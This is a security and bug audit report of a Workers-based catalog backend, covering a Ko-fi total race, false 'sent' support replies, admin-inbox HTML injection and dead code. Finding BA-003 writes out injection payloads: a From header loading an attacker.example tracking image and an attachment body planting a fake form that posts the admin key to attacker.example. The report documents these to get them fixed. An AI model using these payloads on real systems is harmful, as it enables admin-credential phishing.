# Backend audit (2026-11-02, build 7dd96738be)

## Summary for the owner
The backend is in good health. The parts most people use every day (Stremio and Nuvio catalogs, signing in, saving lists, the background jobs) are carefully guarded, and the earlier security reviews have clearly been acted on: every admin route checks the admin login, every account route checks the account, database queries are built safely, outbound calls have timeouts, and nothing personal is cached publicly. I found nothing that leaks one person's data to another and nothing that breaks the site for everyone.

The real problems are in the newest corner, the support-email inbox in `/admin`. First, someone who emails support@ can put their own web-page content into your inbox: a fake "sign in again" box, or a hidden image that tells them when you read it. The site's security settings stop the worst kind of attack (running code), but not a fake form. Second, on a copy of the site without the email-sending setting (every self-hosted copy, by default), pressing Send marks a reply as sent when nothing went out. Third, a customer's screenshot larger than about 1.5 MB is silently dropped.

The Ko-fi donation total can also be wrong. Two payments arriving close together can lose one, and a brief storage hiccup can reset the month's total to a single payment. Since the site's future depends on that number, it is worth fixing.

The rest is small: a cache write that may not finish, the Nuvio and Stremio "Watch History" rows reading someone's whole history on every visit, many error-catching blocks that hide mistakes without logging them, and leftovers from features you already retired. The documentation also lists the wrong job timings in a few places.

Fix BA-003 and BA-002 first: both are small changes. Then fix BA-001.

## Baseline
`bash verify.sh -q` at the start (build `7dd96738be`): every step passed except one test.

- Build, drift, `node --check`, scope check, page/admin/service-worker renders, hostile render, map drift, bundle budget: all OK.
- Tests: **2789 run, 2787 pass, 1 fail, 1 todo.**
  - Fails: `tests/load-performance.test.mjs` "satisfies the < 5 ms warm cache and < 40 ms cold latency budgets" — `cold catalog p90 (80.92ms) must be under 40ms`. Run alone it still fails (77.96 ms, 76.63 ms). With `CI=1` (which skips only the wall-clock asserts) it passes, so the deterministic part of the test (at most 2 KV reads and 0 D1 queries per row) holds. This container is a 4-core shared VM; the failure is a timing budget, not a logic error. It is **pre-existing and not counted as a finding** (see Unverified hunches).
  - Todo (known): `tests/worker.test.mjs` "keeps the creator's newer items # TODO audit #12".

## Progress
"Done" means read for the checks in the brief (routes, auth, owner checks, SQL, bindings, catches, jobs) with targeted reads plus repo-wide scans; files over 2,000 lines were not read line by line. "Scanned" means covered only by the repo-wide scans (dead code, SQL, bindings, catches, un-awaited writes, rate limits, flags) and spot reads.

| file | status (todo / done) | findings |
|---|---|---|
| src/header.js | done | — |
| src/core/00_constants.js | scanned | BA-012 |
| src/core/01_icon-asset.js | scanned | dead-code table |
| src/core/02_http-and-creator-utils.js | done (auth, sessions, CSRF, CSP, fetch guard, rate limits, JSON helpers) | BA-003 (CSP), BA-008 |
| src/core/04_config-resolution.js | done (`resolveConfig`, `decodeConfig`) | BA-008 |
| src/api/25_api-catalog-routes.js | done (router map, catalog/manifest/meta, Ko-fi, posters, OAuth callback, public lists, feedback, configure) | BA-001, BA-008, BA-012, dead-code table |
| src/api/26_api-creator-and-admin-routes.js | done (authenticateCreator, session routes, scrobble webhook, sync saves, admin route gates, exports) | BA-008 |
| src/api/27_installs.js | done (resolution, snapshots, admin routes) | — |
| src/api/28_connections.js | scanned | — |
| src/api/31_lists-api.js | done | — |
| src/api/32_likes-api.js | scanned | — |
| src/api/33_lists-directory.js | scanned | — |
| src/api/61_media-app-sync.js | done (routes, idempotency, collections, addon install) | BA-009 |
| src/catalog/05_catalog-core.js | scanned (+ `fetchAutoTrackedCatalog`, SVG) | BA-007 |
| src/catalog/06, 07 | scanned | BA-006 |
| src/catalog/08, 41, 42, 43, 48, 57 | scanned | — |
| src/data/29, 30, 34, 35, 36, 37, 38, 40 | scanned | dead-code table |
| src/data/39_activity-shelves.js | done (history paging) | BA-007 |
| src/jobs/44_jobs-queue.js | done | — |
| src/jobs/45_jobs-dispatcher.js | done | BA-012 |
| src/jobs/46–60 | scanned (job types, cadences, purge) | BA-009, BA-012 |
| src/admin/03_admin.js (server) | done (admin identity, audit, support goal, telemetry) | BA-001, BA-003, BA-010 |
| src/admin/59_support-emails.js | done | BA-002, BA-003, BA-004, BA-005 |
| schema.sql, schema_activity.sql, migrations/ | scanned (account-keyed tables, indexes for hot WHERE) | BA-009 |
| wrangler.toml, wrangler.selfhost.toml | done | BA-002, BA-012 |

## Fix first (top 10, by severity then effort)
| # | id | one line | severity | effort (S/M/L) |
|---|---|---|---|---|
| 1 | BA-003 | A customer's email can put its own HTML (fake forms, tracking images) into the /admin inbox | P2 | S |
| 2 | BA-002 | Support replies are marked "sent" when no email binding exists | P2 | S |
| 3 | BA-001 | Ko-fi total can lose a payment, or reset to one payment after a storage hiccup | P2 | M |
| 4 | BA-004 | Email attachments over ~1.5 MB are silently dropped | P3 | S |
| 5 | BA-008 | Bare `catch {}` blocks hide errors with no log line; worst one can lose scrobbles | P3 | S (log lines) |
| 6 | BA-007 | Nuvio/Stremio Watch History rows read the whole history on every fetch | P3 | M |
| 7 | BA-006 | TMDB detail cache write is not passed to `waitUntil` and can be cut off | P3 | S |
| 8 | BA-009 | Two account-keyed tables rely on FK cascade, unlike the rest of deletion | P3 | S |
| 9 | BA-010 | Audit-action map and route-access test still list retired admin routes | P3 | S |
| 10 | BA-005 | Support-email audit call has its arguments in the wrong order and never runs | P3 | S |

BA-011 (small dead code, see the table) and BA-012 (docs drift) follow; neither changes behaviour.

## Findings
### BA-001 The Ko-fi support total can lose a payment, or reset to one payment
- Category: bug
- Severity / confidence: P2 / High (path read end to end; the race needs two deliveries close together, the reset needs one failed KV read)
- Where: src/api/25_api-catalog-routes.js:655-657 (the webhook), src/admin/03_admin.js:2421 (`readSupportGoal`), :2460 (`addKofiPaymentToSupportGoal`)
- Evidence:
  ```js
  const next = addKofiPaymentToSupportGoal(await readSupportGoal(env), amount);
  await env.CONFIGS.put(SUPPORT_GOAL_KEY, JSON.stringify(next));
  await env.CONFIGS.put(seenKey, "1", { expirationTtl: 40 * 86400 });
  ```
  ```js
  async function readSupportGoal(env) {
    let stored = null;
    try { const raw = …await env.CONFIGS.get(SUPPORT_GOAL_KEY)…; stored = raw ? JSON.parse(raw) : null; }
    catch { stored = null; }
  ```
  `grep -rn "SUPPORT_GOAL_KEY" src` shows the total lives only in the KV key `support:goal:v1`. KV has no atomic increment, and a read can be up to ~60 s old.
- What goes wrong:
  1. Two webhook calls in the same minute (two donors, or a renewal and a donation) both read the same old total. Each adds its own amount, and the second write replaces the first, so one payment is lost.
  2. If the KV read throws or returns unparsable data, `readSupportGoal` falls back to an empty record (`raised: 0`, `raisedMonth: ""`). The webhook then writes `raised = amount`, which overwrites the whole month's total with this one payment. It also writes `enabled: false` and `goal: 0`, which hides the support strip until you save the goal again.
  3. The "already counted" marker `kofi:msg:<id>` is written after the total. If that second write fails, Ko-fi retries (it retries until it gets a 200) and the payment is counted twice.
  4. Saving the goal in /admin (`applySupportGoalUpdate`) is the same kind of read-modify-write on the same key, so it can also overwrite a payment that arrived at the same moment.
- What a user notices: the support strip shows the wrong amount raised this month: usually too little, occasionally too much, and after a storage error the strip disappears.
- Suggested fix: keep the month's total in D1 as an atomic counter, as D-33 did for every other counter. Bump it with `d1BumpStat(env, "kofi:" + month, ["total"], cents)` (src/admin/03_admin.js, the helper `bumpStatBy` uses) and read it back in `readSupportGoal`. Record the message id in the same D1 `batch` with `INSERT OR IGNORE` into a ledger row (like D-33's `aerecovery:` rows), so "seen" and "counted" happen together. KV then holds only the goal settings, and a failed settings read should return 503 to Ko-fi (so it retries) instead of writing defaults.
- Test that would prove it: `tests/support-goal.test.mjs`. (a) Send two different valid webhooks with `Promise.all` against a KV mock whose `get` returns the pre-write value to both; assert the total is the sum of both. (b) Make the KV `get` throw once; assert the stored goal and total are unchanged and the response is not 200.

### BA-002 Support replies are marked "sent" when nothing was sent (no `EMAIL` binding)
- Category: bug
- Severity / confidence: P2 / High
- Where: src/admin/59_support-emails.js:515-530 (`sendSupportEmailReply`), 645-658 (`composeNewSupportEmail`)
- Evidence:
  ```js
    await env.EMAIL.send(payload);
  } else {
    console.warn('[Support Email] env.EMAIL binding missing. Recorded outbound reply in DB without sending network email.');
  }
  ...
  return { ok: true, message: createdMessage, thread: updatedThread };
  ```
  `composeNewSupportEmail` has the same `if (env.EMAIL && …)` check with no `else`. It then inserts a thread with status `'replied'` and returns `ok: true`. `grep -c send_email wrangler.selfhost.toml` returns 0, so every self-hosted copy is in this state.
- What goes wrong: without an `EMAIL` binding, pressing Send stores the reply, marks the conversation "replied" or "closed", and returns `ok: true`, so the admin page shows it as sent.
- What a user notices: the owner believes they answered a support email; the customer never receives anything.
- Suggested fix: when `env.EMAIL` is missing, return `{ ok: false, error: "Email sending is not set up (no EMAIL binding)." }` before writing anything, in both functions. Keeping it as a draft instead (`ok: true, sent: false`, with the dashboard saying "saved, not sent") is a product choice; see Questions.
- Test that would prove it: a new case in `tests/admin-actions.test.mjs`. As admin, with no `EMAIL` in env, POST `/admin/api/support-emails/reply` and assert `ok === false` and the thread's status is unchanged. Repeat for `/compose` and assert no thread row is created.

### BA-003 A customer's email can put its own HTML into the /admin support inbox
- Category: security
- Severity / confidence: P2 / High for the injection, Medium for the impact (the strict CSP stops scripts but not forms, links or images)
- Where: src/admin/59_support-emails.js:197-220 (inbound attachment parsing) and :73-91 (`parseEmailSender`); src/admin/03_admin.js:6353-6360 (attachment `<img src>` and `<a href>`) and `renderSupportEmailThreadList` (`'<strong …>' + sender + '</strong>'`)
- Evidence:
  ```js
  const mimeType = ctMatch ? ctMatch[1].trim().toLowerCase() : '';      // any text up to ';' or newline
  const base64Clean = partBody.replace(/\s+/g, '');                      // never checked to be base64
  const dataUrl = 'data:' + (mimeType || 'image/png') + ';base64,' + base64Clean;
  ```
  ```js
  '<img src="' + (att.dataUrl || '') + '" alt="' + escapeHtmlAdmin(fn) + '" …>'
  '<a href="' + (att.dataUrl || '#') + '" download=…>'
  const sender = t.customer_name ? (t.customer_name + ' &lt;' + t.customer_email + '&gt;') : t.customer_email;
  ```
  The filename, subject and body text go through `escapeHtmlAdmin`; `dataUrl` and `sender` do not. In `parseEmailSender`, the address group `<([^>]+)>$` accepts `<`, and a `From:` with no `@` is returned whole (`return { name: '', email: raw.toLowerCase() }`). The CSP (`securityHeaders`, src/core/02_http-and-creator-utils.js:171-190) only allows scripts with the page's nonce, so `onerror=` never runs. It has no `form-action` directive, and `img-src` allows any `https:` host.
- What goes wrong: anyone can email support@. Two examples:
  - `From: a <<img src=//attacker.example/p.png>` loads the attacker's image when the inbox list is shown, which tells them you opened it and your IP address. (Cloudflare Email Routing may reject some malformed `From:` headers; not tested. The attachment route below does not depend on headers.)
  - An image part whose body is `x"/><form/action="https://attacker.example"><input/name="k"/placeholder="Admin/key"><button>Sign/in</button></form>` closes the `src` attribute and places a working form inside the conversation.
- What a user notices: nothing unless you type into the fake box. If you do, the admin key goes to the attacker.
- Suggested fix:
  - In the dashboard, escape where the values are inserted: `escapeHtmlAdmin(att.dataUrl)` in both attributes, and build `sender` from `escapeHtmlAdmin(t.customer_name)` and `escapeHtmlAdmin(t.customer_email)`.
  - On the server, accept a part as an image only when `mimeType` matches `/^image\/[a-z0-9.+-]+$/` and the body matches `/^[A-Za-z0-9+/=]+$/`.
  - Add `form-action 'self'` to the CSP. That closes the fake-form route for any other place that misses an escape.
- Test that would prove it: a new case next to `tests/admin-security.test.mjs`. Feed `handleIncomingEmail` a raw message with the image body above and `From: <b>hi</b>`, then render the thread list and the conversation with the dashboard's render functions (in the client harness) and assert no `<form` and no `<b>` in the markup. A second assert checks the CSP header contains `form-action 'self'`.

### BA-004 Large email attachments are dropped without a trace
- Category: bug
- Severity / confidence: P3 / Medium (based on D1's documented 2,000,000-byte limit for a row; not reproduced against real D1)
- Where: src/admin/59_support-emails.js:213-222 (attachments kept inline) and `insertSupportMessage` (:383-440)
- Evidence: attachments are stored as base64 `dataUrl`s inside `attachments_json` with no size cap. `body_text` and `body_html` are capped at 200 KB and 500 KB; attachments are not. In `insertSupportMessage`, a failed first `INSERT` whose error is not `no column named attachments_json` falls through to the last `INSERT`, which leaves `attachments_json` out. The first error is never logged.
- What goes wrong: a ~1.5 MB phone screenshot becomes ~2 MB of base64, which is over the row limit, so the first insert fails. The fallback saves the message without its attachments, and nothing records why.
- What a user notices: a customer writes "see the screenshot attached" and the inbox shows no attachment.
- Suggested fix:
  - Cap the attachments' total size before the insert. When over the cap, keep the text and add a note such as "(1 attachment too large to store: name.png, 3.1 MB)".
  - Log the first insert's error before falling back.
  - The `ALTER TABLE` branch (:401-421) only helps a database built from an older draft of 0021; the column is in `migrations/0021_support_emails.sql:40` and `schema.sql:648` (see the dead-code table).
  - Storing large attachments in R2 (`BLOBS`) would be the fuller fix; that is a product choice.
- Test that would prove it: feed `handleIncomingEmail` a message with a 2.5 MB image part, against a D1 mock that rejects values over 2,000,000 bytes. Assert the stored message says an attachment was dropped, and that `console.error` was called.

### BA-005 The support-email audit call has its arguments in the wrong order (and never runs)
- Category: dead-code
- Severity / confidence: P3 / High
- Where: src/admin/59_support-emails.js:556-559
- Evidence:
  ```js
  if (typeof recordAdminAudit === 'function' && actor) {
    await recordAdminAudit(env, actor, 'support_email_reply', thread.customer_email, threadId);
  }
  ```
  The signature is `recordAdminAudit(env, request, actor, action, detail, status)` (src/admin/03_admin.js:2044). `actor` comes from the request body (`sendSupportEmailReply(env, body)`, :823). The dashboard never sends one: src/admin/03_admin.js:6403-6410 posts only `threadId, text, attachments, closeOnSend`. `composeNewSupportEmail` also accepts `actor` and never uses it.
- What goes wrong: nothing today, because the `&& actor` guard is always false. If anything ever sends `actor`, the audit row gets the actor `support_email_reply` and the customer's email address in the `action` column. The reply is already audited correctly by `isAdminRequest` (D-26), so this block adds nothing.
- What a user notices: nothing.
- Suggested fix: delete the block and the unused `actor` parameter from both functions. This is safe: `isAdminRequest` already writes the audit row for `/admin/api/support-emails/reply` and `/compose`.
- Test that would prove it: none needed beyond the existing audit tests. Optionally, assert in `tests/admin-actions.test.mjs` that a reply produces exactly one audit row.

### BA-006 A TMDB detail cache write is not handed to `waitUntil`
- Category: performance
- Severity / confidence: P3 / Medium
- Where: src/catalog/07_source-fetchers-tmdb-simkl.js:493-496 (`fetchTmdbDetailsUncoalesced`)
- Evidence:
  ```js
  // Persist to Cloudflare KV for 30 days so no other worker or edge ever re-queries this ID
  if (env && env.CONFIGS && imdbId) {
    try {
      env.CONFIGS.put(`tmdbdetail_v2:${kind}:${cleanTmdbId}`, JSON.stringify(result), { expirationTtl: 2592000 }).catch(() => {});
  ```
  The function takes no `ctx` (`async function fetchTmdbDetailsUncoalesced(tmdbId, kind, apiKey, env = null)`). Search: `grep -rnE '^\s*env\.(CONFIGS|DB)\.[a-z.()]*(put|delete|run)\(' src | grep -v 'await\|return\|waitUntil'` finds this line and the admin-only telemetry writes, which are awaited through `Promise.all`.
- What goes wrong: Workers may cancel work that is still pending after the response has gone out. When the catalog row finishes before this put, the 30-day cache entry is never written, and the next request for the same title asks TMDB again.
- What a user notices: occasionally slower rows and more TMDB calls. No wrong data.
- Suggested fix: thread `ctx` through `fetchTmdbDetails` → `fetchTmdbDetailsUncoalesced` and use `ctx.waitUntil(put)`, as `26_` does for `creatorlistorder:` (src/api/26_api-creator-and-admin-routes.js:2409). Or `await` the put (it is one KV write).
- Test that would prove it: in `tests/providers.test.mjs`, call `fetchTmdbDetails` with a fake `ctx` whose `waitUntil` records promises, and assert one recorded promise writes `tmdbdetail_v2:`.

### BA-007 The Nuvio and Stremio "Watch History" rows read the whole history on every fetch
- Category: performance
- Severity / confidence: P3 / Medium (call chain traced; cost not measured on a large account; this is the path for the row in Stremio/Nuvio and for /api/preview)
- Where: src/catalog/05_catalog-core.js:2694-2698, src/data/39_activity-shelves.js:477-490 (`watchHistoryAll`)
- Evidence:
  ```js
  const read = appShelf[2] === 'watch-history'
    ? await watchHistoryAll(env, accountId, appShelf[1])
  ```
  ```js
  for (;;) {
    const part = await watchEventRows(actDb, accountId, cursor, WATCH_HISTORY_READ_ROWS, source);
    rows.push(...part);
    if (part.length < WATCH_HISTORY_READ_ROWS) break;
  ```
  `watchHistoryItems` then looks up every distinct title in chunks of 90 (`SHELF_JOIN_CHUNK`) and every episode title. The site's own `watch-history` branch a few lines further down reads `LIMIT 100`. With a `source`, `watchEventRows` orders by `COALESCE(s.watched_at, e.watched_at)`, which no index covers, so each page sorts all of the account's plays.
- What goes wrong: for an account with 10,000 plays from Nuvio, each fetch of that row reads all 10,000 events, makes one D1 title query per 90 distinct titles plus the episode-title lookups, and builds every item before the page is cut. These rows are personal and sent `no-store`, so every home-screen visit pays the full cost.
- What a user notices: heavy users find their Nuvio/Stremio history row slow to appear, or empty when the request runs out of time.
- Suggested fix: pass the row's `skip` and page size down and use `watchHistoryPage` (src/data/39_activity-shelves.js:432), the paged reader that already exists and is used today only by tests.
- Test that would prove it: in `tests/media-app-sync.test.mjs`, seed 600 Nuvio plays and fetch the `nuvio-watch-history` catalog row with a D1 mock counting `prepare` calls; assert the count does not grow with the number of plays.

### BA-008 Bare `catch {}` blocks hide errors with no log line
- Category: bug
- Severity / confidence: P3 / High that they exist; Low that any one hides a live bug today
- Where: 203 `try` blocks in backend files whose `catch` is empty or comment-only and wraps 4+ lines of code. The full list is in the appendix. Per file: `25_` 45, `26_` 39, `07_` 28, `02_` 26, `03_` 22, `05_` 16, `06_` 10, others ≤2.
- Evidence (the ones that matter most):
  - src/api/26_api-creator-and-admin-routes.js:3928-4053 (77 lines) and :4063-4112 (48 lines): the "rescue" merges in `/api/creator/sync/save-tracking`. They put back plays that a scrobble recorded after the browser last loaded. `} catch { // Merge is best-effort -- never block the save over it. }`. A `TypeError` in there (one malformed old item, for example) silently skips the rescue, and the save that follows overwrites those plays.
  - src/core/04_config-resolution.js:37-154 (79 lines): any throw while reading a stored install link falls through to `decodeConfig`, which answers `unresolved`. The app then shows "That install link was not found" with nothing in the logs.
  - src/api/25_api-catalog-routes.js:6374-6605 (214 lines) and :7331-7488 (150 lines): the Trakt and MDBList "my lists" fetches. A bug in the parsing silently empties Continue Watching or Up Next on the Lists page.
  - Search: a throwaway script (not committed) that finds every `} catch (…) {` whose body is empty or only comments, walks back to the `try {` at the same indent, and counts the non-comment lines between them; blocks of 4+ code lines are listed. verify.sh step 3b (scope_check) already catches the `ReferenceError` class; `TypeError`s are still hidden.
- What goes wrong: a mistake inside one of these blocks is invisible. The feature quietly does less, and Workers logs show nothing.
- What a user notices: a watch that "didn't stick", a link that says "not found" for a moment, or an empty provider shelf, all with no error anywhere.
- Suggested fix: do not remove the catches (the "best effort" intent is right). Add one `console.error("<where>:", e)` line to each, starting with the three above. That changes no behaviour and is safe under CLAUDE.md rule 2.
- Test that would prove it: for save-tracking, `tests/scrobble-queue.test.mjs` already covers the rescue. Add a case whose stored record has a `watchHistory` item of `null`, and assert both that the queued plays survive the save and that `console.error` was not called.

### BA-009 Two account-keyed tables rely on the foreign-key cascade, unlike the rest of account deletion
- Category: bug (defence in depth)
- Severity / confidence: P3 / Medium
- Where: schema.sql:334-346 and migrations/0023_media_app_sync.sql:20 (`media_app_sync`), schema_activity.sql:93-98 (`watch_event_sources`); deletion in src/core/02_http-and-creator-utils.js:1467-1508 (`deleteAccountRow`) and src/jobs/51_account-purge.js
- Evidence: `deleteAccountRow` says "Explicit deletes rather than relying on ON DELETE CASCADE alone … their removal should not depend on a pragma", and deletes `sessions`, `provider_connections`, `account_settings`, `install_secrets` and `installs` by hand. `grep -rn "media_app_sync" src | grep -i delete` finds only the disconnect route (src/api/28_connections.js:344); account deletion never removes those rows. `purgeAccountRowsById` removes `watch_events` but not `watch_event_sources`; both rely on `ON DELETE CASCADE`. `accounts.id` is reused (no AUTOINCREMENT, as `51_` explains).
- What goes wrong: on D1 today, foreign keys are enforced and the cascade removes the rows, so nothing is wrong now. In any setup where the cascade does not fire (a database restored or copied without foreign keys on, or a test D1), the next account given the reused id inherits the old `media_app_sync` row: `push_enabled = 1`, the profile index and the pull cursor. When that new person connects Stremio or Nuvio, two-way sync would be on without their choosing it.
- What a user notices: today, nothing.
- Suggested fix: add `DELETE FROM media_app_sync WHERE account_id = ?` to `deleteAccountRow`'s batch. Add `DELETE FROM watch_event_sources WHERE event_id IN (SELECT id FROM watch_events WHERE account_id = ?)` before the `watch_events` delete in `purgeAccountRowsById`.
- Test that would prove it: `tests/account-purge.test.mjs`. Create an account with a `media_app_sync` row and a `watch_event_sources` row, run the purge against a D1 mock with foreign keys off, and assert both rows are gone.

### BA-010 The audit-action map and the route-access test still list retired admin routes
- Category: dead-code
- Severity / confidence: P3 / High
- Where: src/admin/03_admin.js:1971-1974, :1980, :1982; tests/route-access.test.mjs:45, :48
- Evidence:
  ```js
  "/admin/api/lists-backfill/step": "admin.backfill.lists",
  "/admin/api/lists-backfill/restart": "admin.backfill.lists.restart",
  "/admin/api/activity-backfill/step": "admin.backfill.activity",
  "/admin/api/activity-backfill/restart": "admin.backfill.activity.restart",
  "/admin/api/revoke-all-admin-sessions": "admin.session.revoke-all",
  const ADMIN_AUDIT_GET_MUTATORS = new Set(["/admin/api/migrate-accounts"]);
  ```
  `grep -rn "lists-backfill\|activity-backfill\|migrate-accounts\|revoke-all-admin-sessions" src` finds only these lines and comments. No route matches them, and docs/OPERATIONS.md §9 records that the backfill and migrate-accounts routes were removed on 2026-10-11. "Revoke all" is now `/admin/api/revoke-admin-session` with `all: true`. In the test, `PREFIXES` still lists `/admin/api/activity-backfill/` and `/admin/api/lists-backfill/`; the test checks `REGEX_ROUTES` and the JSON for stale entries but never `PREFIXES`.
- What goes wrong: nothing at run time. The map and the test describe routes that no longer exist, so a future route at one of those paths would get an old audit name and an "already decided" access class without anyone choosing it.
- What a user notices: nothing.
- Suggested fix: remove the five map entries and the GET-mutator entry. Remove the two `PREFIXES` lines and add a stale check for `PREFIXES` (each key must still appear in `scanPrefixRoutes(SOURCES)`), which is the same rule the test already applies to `REGEX_ROUTES`. That tightens the guard; it does not loosen it.
- Test that would prove it: the new stale check in `tests/route-access.test.mjs` fails on today's tree and passes after the two lines go.

### BA-011 Small dead code
- Category: dead-code
- Severity / confidence: P3 / High
- Where / evidence: see the "Dead code" table below. Each entry was found by a token count over all of `src/` (client and page files included, comment-only mentions ignored) and confirmed with `grep -rwn <name> src tests tools`.
- What goes wrong: nothing; it is clutter that misleads the next reader.
- What a user notices: nothing.
- Suggested fix: remove the entries marked "yes" in the table, one commit each, per CLAUDE.md rule 9 only when asked.
- Test that would prove it: `bash verify.sh -q` (scope check) stays green after each removal.

### BA-012 Docs and comments that disagree with the code
- Category: docs
- Severity / confidence: P3 / High
- docs/ARCHITECTURE.md:102-113, the jobs table:
  - `show.refresh` and `shelf.shadow` say "Every 5 min"; the code says hourly (`everyMs: 60 * 60 * 1000`, src/jobs/46_show-refresh.js:342 and src/jobs/47_shelf-shadow.js:559).
  - `cron.housekeeping` says it "Cleans up rate counters, expired keys"; it runs the D1 schema check and `pruneTombstones` (src/jobs/45_jobs-dispatcher.js:610-616).
  - `rollup.daily` says "Analytics Engine rollups"; it fills D1 `title_daily_stats` (src/jobs/53_more-jobs.js:25).
  - Missing from the table: `nos.sweep`, `channel.presets`, `show.watchers`, `activity.copy-new`, `mediaapp.sync`, and the one-off types `account.purge`, `import.resolve`, `poster.fetch`, `mediaapp.sync-account`, `chart.refresh-pages`, `show.refresh-batch`, `recs.build-account`, `channel.pool.build`.
- docs/ARCHITECTURE.md:15 and :135 say the sources run "through `58_`" and "Server-only files (`00_` – `08_`, `25_` – `58_`)"; `59_`, `60_` and `61_` exist.
- docs/OPERATIONS.md:50 says of `DB_ACTIVITY` "nothing uses it yet"; it holds all watch history since `FF_EVENT_TRACKING`.
- docs/OPERATIONS.md:423 says `show.watchers` runs daily; it is hourly (`SHOW_WATCHERS_EVERY_MS = 60 * 60 * 1000`, src/jobs/46_show-refresh.js:45).
- docs/OPERATIONS.md §3 does not list `FF_SCROBBLE_ST_ONLY` or `SCROBBLE_SUNSET_DATE`, which the code reads (`isScrobbleSunset`, src/core/02_http-and-creator-utils.js:2249). wrangler.toml and wrangler.selfhost.toml do.
- wrangler.toml:185-186 still offers `FF_NEW_UI = "1"` as "The new interface for every browser"; the code no longer reads it (Release 21).
- The cron cadence differs: wrangler.toml `*/6`, wrangler.selfhost.toml and OPERATIONS §3 `*/5`, ARCHITECTURE "Every 5 min". OPERATIONS says both work, so only the ARCHITECTURE table needs a word.
- src/api/25_api-catalog-routes.js:962-966 says the `/configure` page "renders the user's own API keys (TMDB/MDBList/Trakt) straight into the HTML". The comment at :939-946 and the code (`nonSecretInstallConfigFields`) say it no longer does. It is safe to reword now: the `no-store` header is still right for a page carrying the link's entries.
- src/core/01_icon-asset.js:1436-1440 says `tests/csp.test.mjs` "pins FFLATE_VENDOR_SHA256"; the test pins the literal hash (tests/csp.test.mjs:277), and the constant is read nowhere.
- docs/DECISIONS.md has two entries numbered D-9 (:88 and :127). The newer one should be D-35.
- What a user notices: nothing. The next person (or AI) reading the docs is misled about timings and switches.
- Suggested fix: edit the lines above. All are text-only.

## Dead code (safe-to-remove list)
| symbol | file:line | how you proved no callers | safe to remove? |
|---|---|---|---|
| `isActivityBound` (local) | src/admin/03_admin.js:2584 | `grep -rwn isActivityBound src tests tools` → only the declaration | yes |
| `pageArg` (local) | src/api/25_api-catalog-routes.js:7548 | only the declaration; the route pages MDBList itself with `offset`/`cursor` (:7580-7660), and the client (src/client/18_…:779) sends no `page` | yes |
| `pubRes` (local) and its `forEach` | src/api/25_api-catalog-routes.js:1058, 1061 | always `{ keys: [] }`, so nothing is ever pushed with `isCreator: false` and the `publishedlist:user:` branch at :1081-1083 can never run | yes, with that branch |
| `FFLATE_VENDOR_SHA256` | src/core/01_icon-asset.js:1443 | read nowhere; the test pins the literal | yes (or keep as documentation and fix the comment, BA-012) |
| audit map entries for retired routes | src/admin/03_admin.js:1971-1974, 1980, 1982 | BA-010 | yes |
| `PREFIXES` entries `/admin/api/{lists,activity}-backfill/` | tests/route-access.test.mjs:45, 48 | BA-010 | yes, with the new stale check |
| support-email audit block and `actor` params | src/admin/59_support-emails.js:444, 556-559, 586 | BA-005 | yes |
| `ALTER TABLE support_messages ADD COLUMN attachments_json` fallback | src/admin/59_support-emails.js:400-421 | the column is in 0021 and schema.sql | after checking /admin → schema status shows `support_messages` with the column on the live DB |

**Test-only (not dead; keep):** these have no caller in `src/` but are imported by tests, which use them to build fixtures or check the retired copies. `clearSessionCache` (02_:1664), `reconcileAccounts` (02_:5897), `resolveMedia` (29_:444), `runListsBackfillStep` (30_:948), `listsBackfillStatus` (30_:1036), `activityBackfillStatus` (37_:830), `watchHistoryPage` (39_:432; BA-007 would give it a real caller), `watchlistShelf` (39_:493). OPERATIONS §9 already says the backfill code stays for the tests.

## Questions for the owner
1. **Old scrobble webhook addresses.** `?config=` and `?creator=&key=` are still accepted (`isScrobbleSunset` is false: `FF_SCROBBLE_ST_ONLY` was removed in Release 14 and `SCROBBLE_SUNSET_DATE` is unset). ARCHITECTURE says they "sunset at Day 60". The `?creator=&key=` form puts the full Account Key in the media server's settings and logs. Do you want to set `SCROBBLE_SUNSET_DATE`, and if so, when? (Not counted as a finding: RELEASES records that turning it off was deliberate.)
2. **Support replies with no email binding (BA-002).** Should Send refuse with a message ("email sending isn't set up"), or keep the reply as a draft that the page labels "not sent"?
3. **Large email attachments (BA-004).** Is "too large to store, here is its name and size" enough, or should large attachments go to R2 so you can still open them?

## Checked and fine
- **Admin gate.** Every `/admin/api/*` route in `26_`, `27_`, `44_` and `59_` calls `isAdminRequest` or `resolveAdminIdentity` before doing anything (scanned each route line for the check in the next 12 lines; the exceptions all check one of the two). `tests/route-access.json` matches the router, and its own test enforces that.
- **Owner checks.** `/api/lists/:id` refuses writes from anyone but the owner (`isOwner`, 31_:283-306). Private lists 404 for others. Channel slugs resolve only public, published channels (35_:136). Installs are matched on `account_id`. Media-app routes use `request.account.id` only.
- **SQL.** Every interpolated `prepare(\`…${…}\`)` interpolates a constant, a column list, or a `?` placeholder list. Large `IN` lists switch to `json_each(?)` above `MEDIA_LOOKUP_CHUNK`, so the 100-parameter limit is respected.
- **Credential checks and rate limits (D-29).** `/admin/login`, `/api/creator/restore`, `/forgot-username` and `/reset-key` use `reserveRateLimit`/`reserveAuthAttempt`. The PBKDF2 throttle (`creatorauth`) deliberately spends first, and only on a memo miss. Secret comparisons use `timingSafeEqualHex`/`timingSafeEqualSecret` (Ko-fi token, OAuth state, key hashes).
- **CSRF** (`verifyCsrf`, 02_:451): same-origin plus a JSON content type for every state change, with a small, exact exemption list.
- **Caching.** `json()` defaults to `no-store`; public caching is opt-in (`jsonCacheable`/`jsonPublic`). Personal catalog rows are `no-store`. The global `fetch` wrapper strips edge caching from any request carrying `Authorization` and adds a 30 s timeout to every outbound call.
- **SSRF and redirects.** Poster URLs are allowlisted by host (`isAllowedPosterUrl`). The `ff_new_ui` redirect forces a single leading slash. The OAuth callbacks redirect only to `url.origin`.
- **Install-link secrets.** `/:config/configure` no longer embeds keys (`nonSecretInstallConfigFields`). Install snapshots are dropped on revoke and on account deletion.
- **Jobs.** Every job type that is enqueued is defined, and every one-off type is created somewhere. Row jobs use compare-and-set leases, so a redelivered message runs once. An unknown type is retried slowly rather than dropped. The cron falls back to doing the work itself when the queue is missing.
- **Optional bindings.** `ANALYTICS`, `IMAGES`, `BLOBS`, `JOBS` and `DB_ACTIVITY` are checked before use at every call site found (`grep -rnE "env\.(ANALYTICS|IMAGES|BLOBS|EMAIL|DB_ACTIVITY|JOBS)\.[a-zA-Z]+\("`). The one gap is `EMAIL`'s behaviour when missing (BA-002).
- **Feature flags.** Every `FF_*` the code reads is in OPERATIONS §3 or wrangler.toml, except as noted in BA-012.
- **Sync saves.** `/api/creator/sync/save`, `save-tracking`, `save-presets`, `save-channels` and `lists/save` have `expectedUpdatedAt` conflict guards.
